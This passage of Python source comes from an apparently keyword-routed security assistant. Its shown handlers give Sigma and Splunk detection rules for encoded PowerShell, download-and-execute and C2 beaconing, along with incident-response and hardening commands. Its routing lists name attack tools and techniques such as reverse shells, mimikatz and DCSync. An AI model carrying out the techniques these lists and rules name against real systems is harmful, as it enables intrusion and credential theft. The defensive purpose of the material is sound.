                    ],
                    "tips": [
                        "Be concise but thorough.",
                        "Use HTTP request/response pairs, not just screenshots.",
                        "Show real impact, not just theoretical.",
                        "One vulnerability per report.",
                        "Don't over-test — stop at PoC, don't exfiltrate data.",
                    ],
                },
            },

            # ── Shared Knowledge ───────────────────────────────────────
            "shared": {
                "reverse_engineering": {
                    "tools": ["Ghidra", "IDA Pro", "Radare2/Rizin", "Binary Ninja", "x64dbg",
                              "dnSpy", "jadx", "apktool"],
                    "techniques": [
                        "Static analysis — Disassembly and decompilation.",
                        "Dynamic analysis — Debugging and runtime observation.",
                        "Malware unpacking — Removing packers/protectors.",
                        "API hooking and tracing.",
                        "Binary patching.",
                        "Protocol reverse engineering.",
                    ],
                },
                "forensics": {
                    "techniques": [
                        "Disk imaging and analysis (FTK Imager, Autopsy).",
                        "Memory forensics (Volatility Framework).",
                        "Network traffic analysis (Wireshark/tshark).",
                        "Log analysis (Windows Event Logs, Syslog).",
                        "File carving and recovery.",
                        "Timeline analysis and artifact correlation.",
                        "Steganography detection.",
                    ],
                    "tools": ["Autopsy", "Volatility", "FTK Imager", "Sleuth Kit",
                              "KAPE", "Eric Zimmerman tools", "Velociraptor"],
                },
                "cryptography": {
                    "topics": [
                        "Padding Oracle Attack", "Hash Length Extension",
                        "Birthday Attack", "RSA attacks",
                        "JWT attacks (none algo, key confusion)", "Brute force / Dictionary",
                    ],
                    "tools": ["Hashcat", "John the Ripper", "CyberChef", "jwt_tool"],
                },
            },
        }

    # ═══════════════════════════════════════════════════════════════════
    #  ROUTING — THINK & RESPOND
    # ═══════════════════════════════════════════════════════════════════

    def _think_and_respond(self, message, history):
        msg = message.lower().strip()

        if self._is_greeting(msg):
            return self._handle_greeting(msg)
        if self._is_identity_question(msg):
            return self._handle_identity()
        if self._is_capability_question(msg):
            return self._handle_capabilities()

        # ── Blue Team Topics ──
        if self._is_soc_question(msg):
            return self._handle_soc(msg, message)
        if self._is_ir_question(msg):
            return self._handle_incident_response(msg, message)
        if self._is_threat_hunting_question(msg):
            return self._handle_threat_hunting(msg, message)
        if self._is_hardening_question(msg):
            return self._handle_hardening(msg, message)
        if self._is_edr_question(msg):
            return self._handle_edr(msg, message)
        if self._is_vuln_mgmt_question(msg):
            return self._handle_vuln_management(msg, message)
        if self._is_email_security_question(msg):
            return self._handle_email_security(msg, message)
        if self._is_threat_intel_question(msg):
            return self._handle_threat_intel(msg, message)

        # ── Red Team Topics ──
        if self._is_methodology_question(msg):
            return self._handle_methodology(msg, message)
        if self._is_recon_question(msg):
            return self._handle_recon(msg, message)
        if self._is_web_security_question(msg):
            return self._handle_web_security(msg, message)
        if self._is_network_attack_question(msg):
            return self._handle_network_attacks(msg, message)
        if self._is_exploitation_question(msg):
            return self._handle_exploitation(msg, message)
        if self._is_privesc_question(msg):
            return self._handle_privesc(msg, message)
        if self._is_ad_question(msg):
            return self._handle_active_directory(msg, message)
        if self._is_cloud_question(msg):
            return self._handle_cloud_security(msg, message)

        # ── Hunter Topics ──
        if self._is_bug_bounty_question(msg):
            return self._handle_bug_bounty(msg, message)
        if self._is_api_security_question(msg):
            return self._handle_api_security(msg, message)
        if self._is_mobile_security_question(msg):
            return self._handle_mobile_security(msg, message)
        if self._is_report_writing_question(msg):
            return self._handle_report_writing(msg, message)

        # ── Shared Topics ──
        if self._is_tool_question(msg):
            return self._handle_tool_question(msg, message)
        if self._is_reverse_engineering_question(msg):
            return self._handle_reverse_engineering(msg, message)
        if self._is_forensics_question(msg):
            return self._handle_forensics(msg, message)
        if self._is_crypto_question(msg):
            return self._handle_crypto(msg, message)
        if self._is_compliance_question(msg):
            return self._handle_compliance(msg, message)
        if self._is_code_question(msg):
            return self._handle_security_code(msg, message)
        if self._is_wireless_question(msg):
            return self._handle_wireless(msg, message)

        return self._handle_general(msg, message, history)

    # ═══════════════════════════════════════════════════════════════════
    #  DETECTION METHODS
    # ═══════════════════════════════════════════════════════════════════

    def _is_greeting(self, msg):
        return any(msg.startswith(g) or msg == g for g in
                   ["hello", "hi", "hey", "greetings", "good morning", "good afternoon",
                    "good evening", "howdy", "what's up", "whats up", "sup", "yo"])

    def _is_identity_question(self, msg):
        return any(p in msg for p in
                   ["who are you", "what are you", "your name", "what's your name",
                    "tell me about yourself", "introduce yourself", "what model",
                    "which ai", "are you chatgpt", "are you gpt", "are you claude"])

    def _is_capability_question(self, msg):
        return any(p in msg for p in
                   ["what can you do", "what are your capabilities", "what are you capable",
                    "what do you do", "how can you help", "help me understand what you"])

    # Blue Team detectors
    def _is_soc_question(self, msg):
        return any(w in msg for w in ["soc", "siem", "splunk", "elastic siem", "sentinel",
                                       "qradar", "wazuh", "alert triage", "detection rule",
                                       "correlation rule", "security operations", "log management",
                                       "detection engineering", "sigma rule", "sigma"])

    def _is_ir_question(self, msg):
        return any(w in msg for w in ["incident response", "incident handling", "ir plan",
                                       "ir playbook", "containment", "eradication",
                                       "recovery", "breach", "compromise", "security incident",
                                       "data breach", "ransomware response", "thehive", "cortex"])

    def _is_threat_hunting_question(self, msg):
        return any(w in msg for w in ["threat hunt", "hunting", "hypothesis", "hunt for",
                                       "proactive detection", "threat hunting",
                                       "behavioral detection", "anomaly detection"])

    def _is_hardening_question(self, msg):
        return any(w in msg for w in ["harden", "hardening", "cis benchmark", "security baseline",
                                       "lockdown", "secure config", "security configuration",
                                       "disable llmnr", "disable netbios", "sysmon",
                                       "attack surface reduction", "asr rule", "selinux",
                                       "apparmor", "fail2ban", "zero trust", "iam policy",
                                       "least privilege", "patch management", "security posture"])

    def _is_edr_question(self, msg):
        return any(w in msg for w in ["edr", "xdr", "ndr", "endpoint detection", "crowdstrike",
                                       "sentinelone", "carbon black", "defender for endpoint",
                                       "cortex xdr", "limacharlie", "endpoint security",
                                       "endpoint monitoring", "endpoint protection"])

    def _is_vuln_mgmt_question(self, msg):
        return any(w in msg for w in ["vulnerability management", "vuln management", "nessus",
                                       "qualys", "openvas", "greenbone", "rapid7", "insightvm",
                                       "vulnerability scan", "patch priorit", "cvss",
                                       "vulnerability assessment", "asset inventory",
                                       "trivy", "grype", "snyk", "dependabot"])

    def _is_email_security_question(self, msg):
        return any(w in msg for w in ["email security", "phishing", "spf", "dkim", "dmarc",
                                       "email gateway", "anti-phishing", "spoofing",
                                       "phishing simulation", "business email compromise",
                                       "bec", "email header", "typosquat"])

    def _is_threat_intel_question(self, msg):
        return any(w in msg for w in ["threat intelligence", "threat intel", "ioc", "indicator",
                                       "misp", "opencti", "virustotal", "otx", "stix", "taxii",
                                       "threat feed", "malware hash", "ip reputation",
                                       "threat actor", "apt", "diamond model", "kill chain"])

    # Red Team detectors
    def _is_methodology_question(self, msg):
        return any(w in msg for w in ["vapt", "penetration testing", "pentest methodology",
                                       "vulnerability assessment", "pentest phases",
                                       "rules of engagement", "pentest report",
                                       "red team", "blue team", "purple team",
                                       "security assessment", "scope of engagement"])

    def _is_recon_question(self, msg):
        return any(w in msg for w in ["recon", "reconnaissance", "osint", "information gathering",
                                       "footprint", "subdomain", "dns enum", "whois", "dork",
                                       "shodan", "censys", "theharvester", "maltego",
                                       "crt.sh", "amass", "subfinder"])

    def _is_web_security_question(self, msg):
        return any(w in msg for w in ["sql injection", "sqli", "xss", "cross-site", "csrf",
                                       "ssrf", "idor", "xxe", "rce", "lfi", "rfi",
                                       "file inclusion", "web vuln", "web security", "web app",
                                       "owasp", "burp", "zap", "injection", "web shell",
                                       "directory traversal", "deserialization", "ssti",
                                       "template injection", "authentication bypass",
                                       "cookie", "jwt", "graphql"])

    def _is_network_attack_question(self, msg):
        return any(w in msg for w in ["network attack", "arp spoof", "mitm", "man in the middle",
                                       "dns spoof", "llmnr", "nbt-ns", "responder", "vlan",
                                       "network pentest", "smb", "snmp", "port scan",
                                       "firewall evasion", "firewall bypass"])

    def _is_exploitation_question(self, msg):
        return any(w in msg for w in ["exploit", "payload", "shellcode", "metasploit", "msfvenom",
                                       "buffer overflow", "rop chain", "cobalt strike", "c2",
                                       "reverse shell", "bind shell", "meterpreter",
                                       "sliver", "havoc", "post-exploit", "lateral movement"])

    def _is_privesc_question(self, msg):
        return any(w in msg for w in ["privilege escalation", "privesc", "priv esc", "escalate",
                                       "suid", "sudo", "gtfobins", "linpeas", "winpeas",
                                       "kernel exploit", "potato", "printspoofer",
                                       "dll hijack", "token impersonation", "seimpersonate"])

    def _is_ad_question(self, msg):
        return any(w in msg for w in ["active directory", "kerberos", "kerberoast", "as-rep",
                                       "bloodhound", "mimikatz", "dcsync", "golden ticket",
                                       "silver ticket", "pass the hash", "pass the ticket",
                                       "rubeus", "impacket", "domain controller", "domain admin",
                                       "adcs", "certipy", "shadow credentials", "gpo abuse"])

    def _is_cloud_question(self, msg):
        return any(w in msg for w in ["cloud security", "aws security", "azure security",
                                       "gcp security", "s3 bucket", "iam escalation",
                                       "metadata", "cloud pentest", "cloud hardening",
                                       "cloud posture", "cspm", "prowler", "scoutsuite",
                                       "managed identity", "service account"])

    # Hunter detectors
    def _is_bug_bounty_question(self, msg):
        return any(w in msg for w in ["bug bounty", "bounty", "hackerone", "bugcrowd",
                                       "intigriti", "responsible disclosure", "vulnerability disclosure",
                                       "bug hunting", "scope", "out of scope", "duplicate",
                                       "triage", "bounty program", "vdp"])

    def _is_api_security_question(self, msg):
        return any(w in msg for w in ["api security", "api testing", "api pentest", "rest api",
                                       "graphql", "bola", "broken object", "mass assignment",
                                       "rate limit", "api key", "api enum", "swagger",
                                       "openapi", "grpc"])

    def _is_mobile_security_question(self, msg):
        return any(w in msg for w in ["mobile security", "android security", "ios security",
                                       "apk", "ipa", "frida", "objection", "mobsf",
                                       "ssl pinning", "mobile app", "deep link"])

    def _is_report_writing_question(self, msg):
        return any(w in msg for w in ["report writing", "write report", "bug report",
                                       "poc", "proof of concept", "write up", "writeup",
                                       "finding report", "vulnerability report",
                                       "impact statement", "cvss score"])

    # Shared detectors
    def _is_tool_question(self, msg):
        return any(w in msg for w in ["nmap", "masscan", "nikto", "gobuster", "ffuf",
                                       "nuclei", "sqlmap", "hashcat", "john the ripper",
                                       "hydra", "wireshark", "tcpdump", "netcat",
                                       "crackmapexec", "enum4linux", "smbclient",
                                       "cyberchef", "feroxbuster"])

    def _is_reverse_engineering_question(self, msg):
        return any(w in msg for w in ["reverse engineer", "disassembl", "decompil", "ghidra",
                                       "ida pro", "radare", "binary ninja", "x64dbg",
                                       "malware", "unpack", "binary analysis",
                                       "dnspy", "jadx", "apktool", "frida"])

    def _is_forensics_question(self, msg):
        return any(w in msg for w in ["forensic", "disk image", "memory dump", "volatility",
                                       "autopsy", "ftk", "sleuth kit", "log analysis",
                                       "event log", "timeline", "artifact", "evidence",
                                       "chain of custody", "kape", "velociraptor"])

    def _is_crypto_question(self, msg):
        return any(w in msg for w in ["cryptography", "encrypt", "decrypt", "cipher", "hash",
                                       "padding oracle", "rsa attack", "hash crack",
                                       "jwt attack", "base64", "xor", "aes"])

    def _is_compliance_question(self, msg):
        return any(w in msg for w in ["compliance", "nist", "iso 27001", "pci-dss", "pci dss",
                                       "hipaa", "soc 2", "mitre att", "cis benchmark",
                                       "cis control", "framework", "security policy",
                                       "risk assessment", "threat model", "security audit", "gdpr"])

    def _is_code_question(self, msg):
        return any(w in msg for w in ["script", "write a", "python", "bash", "powershell",
                                       "automate", "scanner", "code", "program", "function"])

    def _is_wireless_question(self, msg):
        return any(w in msg for w in ["wireless", "wifi", "wpa", "wpa2", "wpa3",
                                       "deauth", "evil twin", "rogue ap", "aircrack"])

    # ═══════════════════════════════════════════════════════════════════
    #  RESPONSE HANDLERS — CORE
    # ═══════════════════════════════════════════════════════════════════

    def _handle_greeting(self, msg):
        name = self._display_name()
        if self._is_blue():
            greetings = [
                f"Hello! I'm **{name}**, your Blue Team defensive security specialist. "
                "I help organizations detect threats, respond to incidents, harden infrastructure, "
                "and build resilient security operations. What's the situation?",
                f"Welcome to the SOC! I'm **{name}** — your go-to for threat detection, "
                "incident response, security hardening, and compliance. How can I help defend your organization?",
            ]
        elif self._is_red():
            greetings = [
                f"Hello! I'm **{name}**, your Red Team offensive security specialist. "
                "I help organizations test their security through authorized penetration testing "
                "and adversary simulation. What's the engagement?",
                f"Operator ready. I'm **{name}** — specializing in VAPT, exploit development, "
                "and adversary simulation for authorized organizational testing. What's the target?",
            ]
        else:
            greetings = [
                f"Hey hunter! I'm **{name}**, your bug bounty and security research specialist. "
                "I help find, exploit, and report vulnerabilities responsibly. Ready to hunt?",
                f"What's up! I'm **{name}** — built for bug bounty hunters and security researchers. "
                "From recon to report writing, I've got you. What are we hacking today?",
            ]
        return random.choice(greetings)

    def _handle_identity(self):
        name = self._display_name()
        profile = self._profile()
        caps = "\n".join(f"- {cap}" for cap in profile["capabilities"])

        if self._is_blue():
            icon_section = (
                "- 🛡️ **SOC Operations** — SIEM management, alert triage, detection engineering\n"
                "- 🚨 **Incident Response** — DFIR, containment, eradication, recovery\n"
                "- 🔍 **Threat Hunting** — Proactive detection using MITRE ATT&CK\n"
                "- 🔒 **Security Hardening** — OS, network, cloud, Active Directory\n"
                "- 📊 **Vulnerability Management** — Scanning, prioritization, patching\n"
                "- 🌐 **Network Defense** — IDS/IPS, NDR, traffic analysis\n"
                "- ☁️ **Cloud Security** — CSPM, IAM, compliance for AWS/Azure/GCP\n"
                "- 📋 **Compliance** — NIST, ISO 27001, PCI-DSS, CIS, HIPAA\n"
                "- 🤖 **Security Automation** — SOAR playbooks, automated response\n"
                "- 📧 **Email Security** — Anti-phishing, SPF/DKIM/DMARC\n"
            )
        elif self._is_red():
            icon_section = (
                "- 🔍 **Reconnaissance** — OSINT, subdomain enum, port scanning\n"
                "- 🌐 **Web Security** — OWASP Top 10, SQLi, XSS, SSRF\n"
                "- 🖧 **Network Attacks** — MITM, LLMNR poisoning, lateral movement\n"
                "- 🏛️ **Active Directory** — Kerberoasting, BloodHound, DCSync\n"
                "- ⬆️ **Privilege Escalation** — Linux & Windows techniques\n"
                "- 💣 **Exploitation** — Metasploit, C2 frameworks, payload crafting\n"
                "- ☁️ **Cloud Security** — AWS, Azure, GCP assessment\n"
                "- 📋 **Reporting** — Findings documentation & remediation\n"
            )
        else:
            icon_section = (
                "- 🎯 **Bug Bounty** — Methodology, platform guidance, program selection\n"
                "- 🌐 **Web Hunting** — IDOR, XSS, SSRF, SQLi, RCE, auth bypass\n"
                "- 🔌 **API Security** — BOLA, mass assignment, GraphQL\n"
                "- 📱 **Mobile Security** — Android/iOS testing with Frida\n"
                "- 🔍 **Recon** — Asset discovery, subdomain enum, JS analysis\n"
                "- 📝 **Report Writing** — PoC templates, impact maximization\n"
                "- 🏆 **CVE Research** — Vulnerability discovery & responsible disclosure\n"
                "- 🚩 **CTF** — Challenge solving & write-ups\n"
            )

        return (
            f"I'm **{name}** (v{self.version}) — {profile['tagline']}.\n\n"
            f"### My Expertise\n{icon_section}\n"
            f"⚠️ All activities must be **authorized and ethical**.\n\n"
            f"What security challenge can I help with?"
        )

    def _handle_capabilities(self):
        profile = self._profile()
        caps = "\n".join(f"- **{c.title()}**" for c in profile["capabilities"])
        return (
            f"## {self._display_name()} Capabilities\n\n"
            f"{caps}\n\n"
            f"What would you like to work on?"
        )

    # ═══════════════════════════════════════════════════════════════════
    #  BLUE TEAM HANDLERS
    # ═══════════════════════════════════════════════════════════════════

    def _handle_soc(self, msg, original):
        kb = self.knowledge_base["blue_team"]["soc_operations"]

        if any(w in msg for w in ["sigma", "detection rule", "detection engineering"]):
            return (
                "## Detection Engineering with Sigma Rules\n\n"
                "### What is Sigma?\n"
                "Sigma is a generic signature format for SIEM systems. Write once, convert to any SIEM.\n\n"
                "### Example: Detect Suspicious PowerShell Execution\n"
                "```yaml\n"
                "title: Suspicious PowerShell Encoded Command\n"
                "status: experimental\n"
                "description: Detects encoded PowerShell commands often used by malware\n"
                "logsource:\n"
                "    category: process_creation\n"
                "    product: windows\n"
                "detection:\n"
                "    selection:\n"
                "        Image|endswith: '\\powershell.exe'\n"
                "        CommandLine|contains:\n"
                "            - '-enc'\n"
                "            - '-EncodedCommand'\n"
                "            - 'FromBase64String'\n"
                "    condition: selection\n"
                "level: high\n"
                "tags:\n"
                "    - attack.execution\n"
                "    - attack.t1059.001\n"
                "```\n\n"
                "### Convert to SIEM Query\n"
                "```bash\n"
                "# Install sigmac / sigma-cli\n"
                "pip install sigma-cli\n\n"
                "# Convert to Splunk\n"
                "sigma convert -t splunk -p sysmon rule.yml\n\n"
                "# Convert to Elastic\n"
                "sigma convert -t elasticsearch rule.yml\n\n"
                "# Convert to Microsoft Sentinel (KQL)\n"
                "sigma convert -t kusto rule.yml\n"
                "```\n\n"
                "### Key Sigma Rule Repositories\n"
                "- [SigmaHQ](https://github.com/SigmaHQ/sigma) — Official rules\n"
                "- Map rules to MITRE ATT&CK techniques\n\n"
                "What detection are you building?"
            )

        if any(w in msg for w in ["splunk", "spl", "search query"]):
            return (
                "## Splunk SPL — Security Queries\n\n"
                "### Detect Brute Force\n"
                "```spl\n"
                "index=security EventCode=4625\n"
                "| stats count by src_ip, user\n"
                "| where count > 10\n"
                "| sort -count\n"
                "```\n\n"
                "### Detect Lateral Movement (PsExec)\n"
                "```spl\n"
                "index=sysmon EventCode=1 \n"
                "Image=\"*\\\\psexec*\" OR ParentImage=\"*\\\\psexec*\"\n"
                "| table _time, Computer, User, Image, CommandLine, ParentImage\n"
                "```\n\n"
                "### Detect Suspicious PowerShell\n"
                "```spl\n"
                "index=sysmon EventCode=1 Image=\"*powershell*\"\n"
                "| where match(CommandLine, \"(?i)(encodedcommand|bypass|downloadstring|invoke-expression|iex)\")\n"
                "| table _time, Computer, User, CommandLine\n"
                "```\n\n"
                "### Detect Data Exfiltration (large DNS queries)\n"
                "```spl\n"
                "index=dns query_length>50\n"
                "| stats count by src_ip, query\n"
                "| where count > 100\n"
                "```\n\n"
                "What SIEM query do you need?"
            )

        tools = ", ".join(kb["tools"])
        techniques = "\n".join(f"- {t}" for t in kb["techniques"])
        return (
            f"## Security Operations Center (SOC)\n\n"
            f"### Core Functions\n{techniques}\n\n"
            f"### SIEM Platforms\n{tools}\n\n"
            f"### SOC Metrics to Track\n"
            f"- **MTTD** — Mean Time to Detect\n"
            f"- **MTTR** — Mean Time to Respond\n"
            f"- **Alert Volume** & False Positive Rate\n"
            f"- **Escalation Rate** & SLA Compliance\n\n"
            f"What SOC challenge are you working on?"
        )

    def _handle_incident_response(self, msg, original):
        kb = self.knowledge_base["blue_team"]["incident_response"]

        if any(w in msg for w in ["ransomware", "ransom"]):
            return (
                "## Ransomware Incident Response Playbook\n\n"
                "### Immediate Actions (First 30 Minutes)\n"
                "1. **DO NOT** pay the ransom or shut down systems immediately.\n"
                "2. **Isolate** affected systems — disconnect from network, don't power off.\n"
                "3. **Preserve evidence** — take memory dumps before any changes.\n"
                "4. **Identify the strain** — check ransom note, encrypted file extensions.\n"
                "5. **Activate IR team** — notify leadership, legal, and communications.\n\n"
                "### Containment (1-4 Hours)\n"
                "```powershell\n"
                "# Isolate endpoint via firewall\n"
                "netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound\n\n"
                "# Block lateral movement — disable remote services\n"
                "sc config lanmanserver start= disabled\n"
                "sc stop lanmanserver\n\n"
                "# Check for persistence\n"
                "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Format-Table TaskName, State\n"
                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
                "```\n\n"
                "### Investigation\n"
                "- Check for lateral movement indicators.\n"
                "- Review backup integrity (offline backups safe?).\n"
                "- Identify initial access vector (phishing, RDP, vulnerability).\n"
                "- Map the timeline of compromise.\n\n"
                "### Recovery\n"
                "- Restore from verified clean backups.\n"
                "- Rebuild compromised systems from known-good images.\n"
                "- Reset ALL credentials (domain-wide if AD compromised).\n"
                "- Patch the initial access vector.\n"
                "- Monitor closely for re-infection.\n\n"
                "### Resources\n"
                "- [NoMoreRansom.org](https://nomoreransom.org) — Free decryption tools\n"
                "- [ID Ransomware](https://id-ransomware.malwarehunterteam.com) — Identify strain\n\n"
                "What stage of the incident are you in?"
            )

        phases = "\n".join(f"  {p}" for p in kb["phases"])
        tools = ", ".join(kb["tools"])
        return (
            f"## Incident Response (DFIR)\n\n"
            f"### IR Lifecycle\n{phases}\n\n"
            f"### Key Tools\n{tools}\n\n"
            f"### Quick Triage Commands\n"
            f"```bash\n"
            f"# Memory dump (Linux)\n"
            f"sudo avml /tmp/memory.lime\n\n"
            f"# Memory dump (Windows - use WinPmem or DumpIt)\n"
            f"# Volatile data collection\n"
            f"hostname && date && whoami\n"
            f"netstat -anob\n"
            f"tasklist /v\n"
            f"wmic process get name,processid,parentprocessid,commandline\n\n"
            f"# Linux triage\n"
            f"ps auxf\n"
            f"ss -tulnp\n"
            f"find / -mtime -1 -type f 2>/dev/null\n"
            f"cat /var/log/auth.log | tail -100\n"
            f"```\n\n"
            f"What type of incident are you responding to?"
        )

    def _handle_threat_hunting(self, msg, original):
        kb = self.knowledge_base["blue_team"]["threat_hunting"]
        methods = "\n".join(f"- {m}" for m in kb["methodologies"])
        tools = ", ".join(kb["tools"])

        return (
            f"## Threat Hunting\n\n"
            f"### Methodologies\n{methods}\n\n"
            f"### Example Hunts\n\n"
            f"**Hunt: Detect C2 Beaconing**\n"
            f"```spl\n"
            f"index=proxy OR index=firewall\n"
            f"| bucket _time span=1h\n"
            f"| stats count by src_ip, dest_ip, _time\n"
            f"| streamstats window=24 avg(count) as avg_conn stdev(count) as std_conn by src_ip, dest_ip\n"
            f"| where std_conn < 2 AND count > 10\n"
            f"| table src_ip, dest_ip, count, avg_conn, std_conn\n"
            f"```\n\n"
            f"**Hunt: Unusual Process Execution**\n"
            f"```spl\n"
            f"index=sysmon EventCode=1\n"
            f"| rare Image by Computer\n"
            f"| where count < 3\n"
            f"| table Computer, Image, count\n"
            f"```\n\n"
            f"**Hunt: DNS Tunneling**\n"
            f"```spl\n"
            f"index=dns\n"
            f"| eval query_len=len(query)\n"
            f"| where query_len > 50\n"
            f"| stats count by src_ip, query\n"
            f"| sort -count\n"
            f"```\n\n"
            f"### Tools\n{tools}\n\n"
            f"What technique are you hunting for?"
        )

    def _handle_hardening(self, msg, original):
        kb = self.knowledge_base["blue_team"]["hardening"]

        if any(w in msg for w in ["linux", "ubuntu", "centos", "rhel", "debian"]):
            items = "\n".join(f"- {h}" for h in kb["linux"])
            return (
                f"## Linux Security Hardening\n\n"
                f"### Checklist\n{items}\n\n"
                f"### Essential Commands\n"
                f"```bash\n"
                f"# SSH hardening (/etc/ssh/sshd_config)\n"
                f"PermitRootLogin no\n"
                f"PasswordAuthentication no\n"
                f"MaxAuthTries 3\n"
                f"AllowUsers adminuser\n\n"
                f"# Install and configure fail2ban\n"
                f"sudo apt install fail2ban\n"
                f"sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local\n"
                f"sudo systemctl enable fail2ban\n\n"
                f"# Kernel hardening (sysctl.conf)\n"
                f"net.ipv4.ip_forward = 0\n"
                f"net.ipv4.tcp_syncookies = 1\n"
                f"net.ipv4.conf.all.rp_filter = 1\n"
                f"net.ipv4.conf.all.accept_redirects = 0\n"
                f"kernel.randomize_va_space = 2\n\n"
                f"# Audit SUID binaries\n"
                f"find / -perm -4000 -type f 2>/dev/null\n\n"
                f"# CIS Benchmark scan\n"
                f"sudo lynis audit system\n"
                f"```\n\n"
                f"Which area needs hardening?"
            )

        if any(w in msg for w in ["windows", "gpo", "group policy", "defender"]):
            items = "\n".join(f"- {h}" for h in kb["windows"])
            return (
                f"## Windows Security Hardening\n\n"
                f"### Checklist\n{items}\n\n"
                f"### Key Configurations\n"
                f"```powershell\n"
                f"# Enable PowerShell Script Block Logging\n"
                f"# GPO: Computer > Admin Templates > Windows Components > PowerShell\n"
                f"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1\n\n"
                f"# Disable LLMNR\n"
                f"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient' -Name EnableMulticast -Value 0 -PropertyType DWord\n\n"
                f"# Disable NetBIOS over TCP/IP (per adapter)\n"
                f"# Network adapter properties > IPv4 > Advanced > WINS > Disable NetBIOS\n\n"
                f"# Enable Windows Firewall logging\n"
                f"netsh advfirewall set allprofiles logging filename %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\n"
                f"netsh advfirewall set allprofiles logging maxfilesize 4096\n"
                f"netsh advfirewall set allprofiles logging droppedconnections enable\n\n"
                f"# Install Sysmon with SwiftOnSecurity config\n"
                f"sysmon64.exe -accepteula -i sysmonconfig-export.xml\n"
                f"```\n\n"
                f"What Windows environment are you hardening?"
            )

        if any(w in msg for w in ["active directory", "ad ", "domain"]):
            items = "\n".join(f"- {h}" for h in kb["active_directory"])
            return (
                f"## Active Directory Hardening\n\n"
                f"### Checklist\n{items}\n\n"
                f"### Priority Actions\n"
                f"```powershell\n"
                f"# Add privileged accounts to Protected Users group\n"
                f"Add-ADGroupMember -Identity 'Protected Users' -Members admin_account\n\n"
                f"# Find accounts with SPN (Kerberoasting targets)\n"
                f"Get-ADUser -Filter {{ServicePrincipalName -ne '$null'}} -Properties ServicePrincipalName\n\n"
                f"# Find accounts without pre-authentication (AS-REP Roasting targets)\n"
                f"Get-ADUser -Filter {{DoesNotRequirePreAuth -eq $true}}\n\n"
                f"# Audit AdminSDHolder permissions\n"
                f"Get-ACL 'AD:CN=AdminSDHolder,CN=System,DC=domain,DC=local' | Format-List\n\n"
                f"# Enable advanced audit policies\n"
                f"auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable\n"
                f"```\n\n"
                f"What's your AD environment like?"
            )

        if any(w in msg for w in ["cloud", "aws", "azure", "gcp"]):
            items = "\n".join(f"- {h}" for h in kb["cloud"])
            return (
                f"## Cloud Security Hardening\n\n"
                f"### Universal Checklist\n{items}\n\n"
                f"### Quick Audit Commands\n"
                f"```bash\n"
                f"# AWS — Run Prowler audit\n"
                f"prowler aws --compliance cis_level2_aws\n\n"
                f"# AWS — Check public S3 buckets\n"
                f"aws s3api list-buckets --query 'Buckets[].Name' | xargs -I{{}} aws s3api get-bucket-acl --bucket {{}}\n\n"
                f"# Azure — Run ScoutSuite\n"
                f"python scout.py azure --cli\n\n"
                f"# GCP — Check IAM policies\n"
                f"gcloud projects get-iam-policy PROJECT_ID\n"
                f"```\n\n"
                f"Which cloud provider are you securing?"
            )

        # General hardening overview
        return (
            "## Security Hardening\n\n"
            "Which environment do you need to harden?\n\n"
            "- 🐧 **Linux** — SSH, firewall, kernel, SELinux, CIS benchmarks\n"
            "- 🪟 **Windows** — GPO, Defender, Sysmon, PowerShell logging, ASR\n"
            "- 🏛️ **Active Directory** — Tiered admin, LAPS, kerberos hardening\n"
            "- ☁️ **Cloud** — IAM, encryption, CSPM, guardrails\n"
            "- 🌐 **Network** — Segmentation, IDS/IPS, NAC, TLS\n\n"
            "Tell me your environment and I'll provide a hardening roadmap."
        )

    def _handle_edr(self, msg, original):
        kb = self.knowledge_base["blue_team"]["edr_xdr"]
        tools = ", ".join(kb["tools"])
        caps = "\n".join(f"- {c}" for c in kb["capabilities"])
        return (
            f"## Endpoint Detection & Response (EDR/XDR)\n\n"
            f"### Capabilities\n{caps}\n\n"
            f"### Platforms\n{tools}\n\n"
            f"### Deployment Best Practices\n"
            f"- Deploy agents to ALL endpoints (servers + workstations).\n"
            f"- Enable all detection modules (behavioral, signature, ML).\n"
            f"- Configure automated containment for high-severity alerts.\n"
            f"- Integrate with SIEM for centralized visibility.\n"
            f"- Regularly update detection rules and threat intelligence.\n"
            f"- Test detection with adversary simulation (Atomic Red Team).\n\n"
            f"### Open-Source EDR Setup (Wazuh)\n"
            f"```bash\n"
            f"# Deploy Wazuh manager (Docker)\n"
            f"docker compose -f docker-compose.yml up -d\n\n"
            f"# Install agent on endpoint\n"
            f"# Linux:\n"
            f"curl -so wazuh-agent.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/...\n"
            f"sudo dpkg -i wazuh-agent.deb\n"
            f"sudo systemctl start wazuh-agent\n"
            f"```\n\n"
            f"What EDR capability are you looking for?"
        )

    def _handle_vuln_management(self, msg, original):
        kb = self.knowledge_base["blue_team"]["vulnerability_management"]
        tools = ", ".join(kb["tools"])
        process = "\n".join(f"  {p}" for p in kb["process"])
        return (
            f"## Vulnerability Management Program\n\n"
            f"### Process\n{process}\n\n"
            f"### Tools\n{tools}\n\n"
            f"### Prioritization Strategy\n"
            f"- **Critical + Exploitable + Internet-facing** → Patch within 24-48 hours\n"
            f"- **High + Exploitable** → Patch within 7 days\n"
            f"- **Medium** → Patch within 30 days\n"
            f"- **Low** → Next patch cycle\n\n"
            f"### Key Metrics\n"
            f"- Mean Time to Remediate (MTTR)\n"
            f"- SLA compliance percentage\n"
            f"- Vulnerability aging (open > 30/60/90 days)\n"
            f"- Risk reduction over time\n\n"
            f"What aspect of vuln management do you need help with?"
        )

    def _handle_email_security(self, msg, original):
        kb = self.knowledge_base["blue_team"]["email_security"]
        controls = "\n".join(f"- {c}" for c in kb["controls"])
        return (
            f"## Email Security\n\n"
            f"### Controls\n{controls}\n\n"
            f"### SPF/DKIM/DMARC Setup\n"
            f"```dns\n"
            f"# SPF Record (TXT)\n"
            f"v=spf1 include:_spf.google.com include:mail.example.com -all\n\n"
            f"# DKIM (TXT) — generated by email provider\n"
            f"k=rsa; p=MIGfMA0GCSq...\n\n"
            f"# DMARC Record (TXT)\n"
            f"v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@example.com; pct=100\n"
